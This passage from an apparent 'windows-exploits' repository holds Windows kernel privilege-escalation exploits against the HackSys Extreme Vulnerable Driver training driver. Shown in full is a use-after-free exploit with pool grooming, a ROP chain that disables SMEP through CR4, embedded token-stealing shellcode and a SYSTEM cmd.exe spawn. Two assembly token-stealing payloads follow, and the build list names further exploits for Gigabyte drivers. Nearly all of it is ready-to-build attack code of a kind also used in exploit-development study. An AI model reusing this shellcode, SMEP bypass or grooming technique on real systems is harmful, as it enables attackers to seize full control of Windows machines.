	// prepare rop to disable smep & jump to sc_ptr
	QWORD rop = STACK_PIVOT_ADDR;
	*(QWORD*)(rop) = ntBase + POP_RCX;
	*(QWORD*)(rop + 8) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(QWORD*)(rop + 16) = ntBase + MOV_CR4_RCX;
	*(QWORD*)(rop + 24) = (ULONGLONG)sc_ptr;

	// exploit type confusion, will execute our stack_pivot & return into the fake stack
	TypeConfBuffer tcBuf = { 0 };
	tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
	tcBuf.controllableFunc = (ULONG_PTR)ntBase + STACK_PIVOT;

	printf("\n[>] Press enter to exploit...\n");
	getchar();

	DeviceIoControl(hDriver, IOCTL(0x808), &tcBuf, sizeof(tcBuf), NULL, 0, NULL, NULL);
	system("cmd.exe");
	return 0;
}
```

`windows-exploits/HevdUAFMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include <vector>

/*
   HEVD UAF / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Allocate UaF object, Free object, Allocate Fake object (will be interpreted as UaF Object & we get control over a pointer), Use UaF Object.
   We have to "hope" that the Fake object gets into the same spot as the UaF object was before being freed.

   Debug: 
   ba e1 HEVD!IrpDeviceIoCtlHandler+60
   ba e1 HEVD!AllocateUaFObjectNonPagedPool
   ba e1 HEVD!FreeUaFObjectNonPagedPool
   ba e1 HEVD!UseUaFObjectNonPagedPool

   NTSTATUS Description: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
*/

namespace HevdUAFMINS {
    DWORD ALLOCATE_UAF_IOCTL = 0x222013;
    DWORD FREE_UAF_IOCTL = 0x22201B;
    DWORD FAKE_OBJECT_IOCTL = 0x22201F;
    DWORD USE_UAF_IOCTL = 0x222017;

	// static gadgets, replace for other kernel version
	DWORD STACK_PIVOT = 0x5988ce; //0x1405988ce: mov esp, 0x83000000 ; ret ;
	QWORD STACK_PIVOT_ADDR = 0x83000000;
	DWORD MOV_CR4_RCX = 0x514999;
	DWORD POP_RCX = 0x99710c;

	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	void CreateUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	void FreeUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	void CreateFakeObject(HANDLE hDriver) {
		// leak ntBase (medium integrity)
		QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");

		// prepare sc
		LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(sc_ptr, sc, sizeof(sc));

		// prepare stack
		DWORD stack_addr = STACK_PIVOT_ADDR - 0x1000;
		printf("[*] Allocating fake stack @ %llx\n", stack_addr);
		LPVOID stack_ptr = VirtualAlloc((LPVOID)stack_addr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		printf("[>] Fake Stack: %llx\n", stack_ptr);

		// push & read some values in the fake stack region to make sure its paged
		printf("[>] Page in stack..\n");
		int step = 0x800;
		for (int i = 0; i <= 0x15000 / step; i++) {
			*(QWORD*)((QWORD)stack_ptr + i * step) = 0xdeadc0de;
			printf("%llx:%llx ", (QWORD)stack_ptr + i * step, *(QWORD*)((QWORD)stack_ptr + i * step));
			*(QWORD*)((QWORD)stack_ptr + i * step) = 0x0;
		}		
		printf("\n");

		// prepare rop to disable smep & jump to sc_ptr by writing to fake stack region
		QWORD rop = STACK_PIVOT_ADDR;
		*(QWORD*)(rop) = ntBase + POP_RCX;
		*(QWORD*)(rop + 8) = 0x50ef8; // rcx value with 20th bit zeroed out
		*(QWORD*)(rop + 16) = ntBase + MOV_CR4_RCX;
		*(QWORD*)(rop + 24) = (ULONGLONG)sc_ptr;

		BYTE uBuffer[0x60] = { 0 };
		*(QWORD*)(uBuffer) = (QWORD)(ntBase + STACK_PIVOT);
		printf("[>] ScPtr: 0x%llx\n", sc_ptr);

		printf("[>] Spraying fake objects to fill some holes\n");
		DWORD retBytes = 0;
		for (int i = 0; i < 30000; i++) {
			DeviceIoControl(hDriver, FAKE_OBJECT_IOCTL, uBuffer, sizeof(uBuffer), NULL, 0, &retBytes, NULL);
		}
	}

	void UseUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, USE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	typedef struct PipeHandles {
		HANDLE read;
		HANDLE write;
	} PipeHandles;

	PipeHandles CreatePipeObject() {
		DWORD ALLOC_SIZE = 0x70;
		BYTE uBuffer[0x28]; // ALLOC_SIZE - 0x48, 0x48 is the header size
		BOOL res = FALSE;
		HANDLE readPipe = NULL;
		HANDLE writePipe = NULL;
		DWORD resultLength;

		// Write the data in user space buffer
		RtlFillMemory(uBuffer, 0x28, 0x41);

		// Creating the pipe to kernel space
		// size and contents of the allocated pool chunk will depend on the uBuffer variable
		// size confirmed by poolMonitor, whats in the nonpaged pool are the Data_ENTRY records it uses internally
		// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-poolfind !poolfind NpFr 0
		res = CreatePipe(&readPipe,	&writePipe,	NULL, sizeof(uBuffer));
		if (res == FALSE)
		{
			printf("[!] Failed creating Pipe\r\n");
			exit(-1);
		}

		// Write data into the kernel space buffer from user space buffer
		// The following API call will trigger allocation in non-paged pool
		res = FALSE;
		res = WriteFile(writePipe, uBuffer,	sizeof(uBuffer), &resultLength,	NULL);
		if (res == FALSE)
		{
			printf("[!] Failed writing to Pipe\r\n");
			exit(-1);
		}		
		return PipeHandles{ readPipe, writePipe };	
	}

	void Exploit(int argc, char** argv) {
		HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// Pool Defragmentation Spray
		// check via !poolused 2 NpFr
		printf("[>] Spraying pool defragmentation..\n");
		std::vector<PipeHandles> defragPipeHandles;
		for (int i = 0; i < 20000; i++) {
			PipeHandles pipeHandle = CreatePipeObject();
			defragPipeHandles.push_back(pipeHandle);
		}

		// Groom Pool
		// check via !poolused 2 NpFr
		printf("[>] Spraying sequential allocation..\n");
		std::vector<PipeHandles> seqPipeHandles;
		for (int i = 0; i < 60000; i++) {
			PipeHandles pipeHandle = CreatePipeObject();
			seqPipeHandles.push_back(pipeHandle);
		}

		// Punch holes (Closing the handles frees the allocations)
		// check via  !poolused 2 NpFr
		printf("[>] Punching holes...\n");
		for (int i = 0; i < seqPipeHandles.size(); i++) {
			if (i % 2 == 0) {
				PipeHandles handles = seqPipeHandles[i];
				CloseHandle(handles.read);
				CloseHandle(handles.write);
			}
		}

		printf("[>] Look at my handles: 0x%llx, 0x%llx\n", seqPipeHandles[29997].read, seqPipeHandles[29997].write);

		/*
		1: kd> !handle 4e764
			PROCESS ffffe30e412912c0
				SessionId: 1  Cid: 0cd4    Peb: bf33e55000  ParentCid: 1e08
				DirBase: 887ec000  ObjectTable: ffffbc0c971194c0  HandleCount: 50036.
				Image: Exploit.exe

			Handle table at ffffbc0c971194c0 with 50036 entries in use

			4e764: Object: ffffe30e45c15d80  GrantedAccess: 00120196 (Protected) (Audit) Entry: ffffbc0c9d8ebd90
			Object: ffffe30e45c15d80  Type: (ffffe30e3d2f3da0) File
				ObjectHeader: ffffe30e45c15d50 (new version)
					HandleCount: 1  PointerCount: 32768

		   kd> !pool ffffe30e45c15d80
		*/

		//getchar();
		//DebugBreak();


		// Put the UAF object into a hole
		printf("[>] Allocating UAF Object\n");
		CreateUAFObject(hDriver);

		// Free it again
		printf("[>] Freeing UAF Object\n");
		FreeUAFObject(hDriver);

		// Spray fake objects holes, hopefully hitting the one we need
		printf("[>] Preparing payload..\n");
		CreateFakeObject(hDriver);

		// call freed pointer (hopefuly its replaced with our fake object now)
		printf("[!] Press enter to continue\n");
		getchar();
		printf("[*] Triggering UAF FuncPtr\n");
		UseUAFObject(hDriver);

		system("cmd.exe");
	}
}

int HevdUAFMI(int argc, char** argv) {
	printf("~-------------------~\n");
	printf("  Running HevdUAFMI  \n");
	printf("~-------------------~\n");

	HevdUAFMINS::Exploit(argc, argv);
	return 0;
}
```

`windows-exploits/Template.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
   Template - Copy Paste to get started

   Author: @xct_de
   Target: 10.0.19044

   Setup:
   Add your function (here Template) also to Exploits.h & call it in Exploit.cpp

*/

int Template(int argc, char** argv) {

	return 0;
}
```

`windows-exploits/TokenStealingBail.asm`:

```asm
[BITS 64]
; https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html
start:
	xor rax, rax
	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field
	mov rax, [rax+0xb8]				; Get (KAPC_STATE)ApcState.Process (our EPROCESS)
	mov r9, rax;					; Backup target EPROCESS at r9
	mov rax, [rax + 0x448]			; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link
	mov rax, [rax]					; Follow the first link

system_process_loop:
	mov rdx, [rax - 0x8]			; ProcessId
	mov r8, rax;					; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]					; Next process
	cmp rdx, 4						; System PID
	jnz system_process_loop
	
	mov rdx, [r8 + 0x70]
	and rdx, 0xfffffffffffffff8		; Ignore ref count
	mov rcx, [r9 + 0x4b8]
	and rcx, 0x7
	add rdx, rcx					; put target's ref count into our token
	mov [r9 + 0x4b8], rdx			; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff
	
ret_to_usermode:
	mov rax, [gs:0x188]				; _KPCR.Prcb.CurrentThread
	mov cx, [rax + 0x1e4]			; KTHREAD.KernelApcDisable
	inc cx
	mov [rax + 0x1e4], cx
	mov rdx, [rax + 0x90] 			; ETHREAD.TrapFrame
	mov rcx, [rdx + 0x168]			; ETHREAD.TrapFrame.Rip
	mov r11, [rdx + 0x178]			; ETHREAD.TrapFrame.EFlags
	mov rsp, [rdx + 0x180]			; ETHREAD.TrapFrame.Rsp
	mov rbp, [rdx + 0x158]			; ETHREAD.TrapFrame.Rbp
	xor eax, eax 					; return STATUS_SUCCESS to NtDeviceIoControlFile 
	swapgs
	o64 sysret
```

`windows-exploits/TokenStealingWin7x64.asm`:

```asm
[BITS 64]
Start:
xor rax, rax                    
mov rax, gs:[rax + 188h]                                       
mov rax, [rax + 70h]            
mov rcx, rax                    
mov r11, rcx                    
and r11, 7
mov rdx, 4h    

SearchSystem:
mov rax, [rax + 188h]           
sub rax, 188h
cmp[rax + 180h], rdx            
jne SearchSystem

mov rdx, [rax + 208h]           
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 208h], rdx         
                              
ret
```

`windows-exploits/windows-exploits.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{7cdb586a-538b-4b90-a8c3-6575673e7dd5}</ProjectGuid>
    <RootNamespace>windowsexploits</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>bin</OutDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <TargetName>exploit</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DisableSpecificWarnings>4005;4477;4312;4244;4312;4229;4334;4838;4018;4267</DisableSpecificWarnings>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Common.cpp" />
    <ClCompile Include="Exploit.cpp" />
    <ClCompile Include="Gadgets.cpp" />
    <ClCompile Include="GigabyteDriverMI.cpp" />
    <ClCompile Include="GigabyteDriverLI.cpp" />
    <ClCompile Include="HevdNullPointerMIWin7x64.cpp" />
    <ClCompile Include="HevdPoolOverflowWin7x64.cpp" />
    <ClCompile Include="HevdStackOverflowACLMI.cpp" />
    <ClCompile Include="HevdStackOverflowGSMI.cpp" />
    <ClCompile Include="HevdArbitraryWriteMI.cpp" />
    <ClCompile Include="HevdStackOverflowMI.cpp" />
    <ClCompile Include="HevdStackOverflowRopMI.cpp" />
    <ClCompile Include="HevdTypeConfusionMI.cpp" />
    <ClCompile Include="HevdTypeConfusionMI2.cpp" />
    <ClCompile Include="HevdUAFMI.cpp" />
    <ClCompile Include="Template.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Common.h" />
    <ClInclude Include="Exploits.h" />
    <ClInclude Include="Gadgets.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`windows-exploits/windows-exploits.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Shellcode">
      <UniqueIdentifier>{290827a3-509e-42b3-9beb-7acd6381f38e}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HevdStackOverflowGSMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdStackOverflowMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdTypeConfusionMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdTypeConfusionMI2.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdUAFMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Template.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Common.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Exploit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="GigabyteDriverMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="GigabyteDriverLI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdArbitraryWriteMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdPoolOverflowWin7x64.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdStackOverflowRopMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdNullPointerMIWin7x64.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Gadgets.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HevdStackOverflowACLMI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Exploits.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Gadgets.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```